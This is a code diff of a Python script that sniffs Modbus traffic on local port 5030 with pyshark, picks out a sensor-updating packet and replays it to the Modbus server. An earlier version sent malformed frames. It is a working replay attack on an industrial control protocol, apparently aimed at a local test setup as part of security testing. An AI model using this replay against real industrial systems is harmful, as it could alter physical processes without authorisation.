@@ -2,38 +2,38 @@ from concurrent.futures import thread
 import socket
 import pyshark
 
-capture_filter = "tcp.port == 5030"
+CAPTURE_FILTER = "tcp.port == 5030"
+LOCAL_ADDRESS = 'localhost'
+PORT = 5030
 
-cap = pyshark.LiveCapture(interface='Adapter for loopback traffic capture', display_filter=capture_filter)
+# Define the byte patterns to check
+exclude_pattern = b'\x00\x06\x01\x03\x00\x00\x00\x01'
 
+cap = pyshark.LiveCapture(interface='Adapter for loopback traffic capture', display_filter=CAPTURE_FILTER)
 payload = None
 
+# Sniff packets on Adapter for loopback traffic capture 
+# interface using 5030 port until a packet on TCP with payload is found
 for packet in cap.sniff_continuously():
-    if 'Data' in packet:
-        if hasattr(packet, 'tcp') and hasattr(packet.tcp, 'payload'):
-            payload = packet.Data.Data
-            print(f"Packet Data: {payload}")
+        if hasattr(packet, 'tcp') and hasattr(packet, 'Data') and hasattr(packet.Data, 'Data'):
+            payload = bytes.fromhex(packet.Data.Data)
+            print(f"Found a Modbus packet. Packet Data: {payload}")
 
-            break
-
-print("found a packet with payload")
+            if not payload.endswith(exclude_pattern):
+                print(f"Found sensor updating packet. Payload: {payload}")
+                break
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-    # try:
+    try:
         sock.settimeout(60)
-        sock.connect(("localhost", 5030))  # Connect to Modbus server
-        print("Connected, replaying the message")
-        print(type(payload))
-                
-        # Convert the cleaned string (which is now a valid hex string) to bytes
-        raw_payload = bytes.fromhex(payload)  # Now this is valid hex
+        sock.connect((LOCAL_ADDRESS, PORT))  # Connect to Modbus server
+        print(f"Connected, replaying the message {payload}")
 
-        print(type(raw_payload))
-        sock.sendall(raw_payload)  # Send invalid Modbus frame
+        sock.sendall(payload)  # Send Modbus frame
         response = sock.recv(1024)  # Receive server's response
         
-        print("Sent Malformed Request:", raw_payload.hex())
+        print("Sent Request:", payload.hex())
         print("Received Response:", response.hex())
 
-    # except Exception as e:
-    #     print(f"Error sending malformed Modbus request: {e}")
+    except Exception as e:
+        print(f"Error sending Modbus request: {e}")
